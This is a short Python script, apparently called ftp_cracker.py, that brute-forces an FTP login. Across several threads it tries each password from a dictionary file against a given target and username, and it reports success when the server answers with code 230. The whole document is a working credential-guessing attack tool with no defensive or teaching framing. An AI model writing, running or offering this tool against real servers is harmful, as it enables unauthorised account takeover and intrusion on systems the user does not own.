import socket
import time
import sys
import threading

def brute_force_ftp(target, username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 21))
    s.recv(1024) # Receive the banner
    s.send(f"USER {username}\r\n".encode())
    s.recv(1024)
    s.send(f"PASS {password}\r\n".encode())
    resp = s.recv(1024)
    s.close()
    return resp

def brute_force(target, username, passwords):
    for password in passwords:
        resp = brute_force_ftp(target, username, password)
        if "230" in resp.decode():
            print(f"Password found: {password}")
            return
        elif "530" in resp.decode():
            print(f"Password incorrect: {password}")
        time.sleep(1) # Add delay between attempts

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python ftp_cracker.py <target_IP> <username> <dictionary_file> <num_threads>")
        sys.exit(1)

    target = sys.argv[1]
    username = sys.argv[2]
    dictionary_file = sys.argv[3]
    num_threads = int(sys.argv[4])

    with open(dictionary_file, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    chunk_size = len(passwords) // num_threads
    chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=brute_force, args=(target, username, chunks[i]))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
